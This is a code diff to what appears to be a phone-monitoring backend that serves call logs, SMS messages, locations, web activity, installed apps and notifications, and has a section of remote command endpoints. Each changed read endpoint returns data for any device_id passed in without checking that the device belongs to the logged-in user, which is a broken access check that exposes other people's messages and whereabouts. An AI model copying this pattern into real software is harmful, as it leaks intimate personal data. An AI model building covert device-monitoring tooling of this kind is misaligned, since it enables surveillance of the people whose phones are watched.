@@ -78,10 +78,11 @@ def create_call_log_for_user(
 
 @router.get("/users/me/call_logs/", response_model=List[schemas.CallLog])
 def read_call_logs_for_user(
-    skip: int = 0, limit: int = 100, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
+    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
 ):
-    call_logs = crud.get_call_logs_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)
-    return call_logs
+    if device_id:
+        return crud.get_call_logs_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
+    return crud.get_call_logs_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)
 
 @router.post("/users/me/sms_messages/", response_model=schemas.SmsMessage)
 def create_sms_message_for_user(
@@ -91,10 +92,11 @@ def create_sms_message_for_user(
 
 @router.get("/users/me/sms_messages/", response_model=List[schemas.SmsMessage])
 def read_sms_messages_for_user(
-    skip: int = 0, limit: int = 100, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
+    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
 ):
-    sms_messages = crud.get_sms_messages_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)
-    return sms_messages
+    if device_id:
+        return crud.get_sms_messages_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
+    return crud.get_sms_messages_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)
 
 @router.post("/users/me/app_usage/", response_model=schemas.AppUsage)
 def create_app_usage_for_user(
@@ -104,8 +106,10 @@ def create_app_usage_for_user(
 
 @router.get("/users/me/app_usage/", response_model=List[schemas.AppUsage])
 def read_app_usage_for_user(
-    skip: int = 0, limit: int = 100, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
+    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
 ):
+    if device_id:
+        return crud.get_app_usage_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
     return crud.get_app_usage_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)
 
 @router.post("/users/me/web_activity/", response_model=schemas.WebActivity)
@@ -116,8 +120,10 @@ def create_web_activity_for_user(
 
 @router.get("/users/me/web_activity/", response_model=List[schemas.WebActivity])
 def read_web_activity_for_user(
-    skip: int = 0, limit: int = 100, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
+    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
 ):
+    if device_id:
+        return crud.get_web_activity_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
     return crud.get_web_activity_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)
 
 @router.post("/users/me/installed_apps/", response_model=schemas.InstalledApp)
@@ -128,8 +134,10 @@ def create_installed_app_for_user(
 
 @router.get("/users/me/installed_apps/", response_model=List[schemas.InstalledApp])
 def read_installed_apps_for_user(
-    skip: int = 0, limit: int = 100, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
+    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
 ):
+    if device_id:
+        return crud.get_installed_apps_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
     return crud.get_installed_apps_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)
 
 @router.post("/users/me/notifications/", response_model=schemas.Notification)
@@ -140,8 +148,10 @@ def create_notification_for_user(
 
 @router.get("/users/me/notifications/", response_model=List[schemas.Notification])
 def read_notifications_for_user(
-    skip: int = 0, limit: int = 100, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
+    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
 ):
+    if device_id:
+        return crud.get_notifications_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
     return crud.get_notifications_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)
 
 @router.post("/users/me/locations/", response_model=schemas.Location)
@@ -152,8 +162,10 @@ def create_location_for_user(
 
 @router.get("/users/me/locations/", response_model=List[schemas.Location])
 def read_locations_for_user(
-    skip: int = 0, limit: int = 100, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
+    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
 ):
+    if device_id:
+        return crud.get_locations_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
     return crud.get_locations_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)
 
 # Command Endpoints
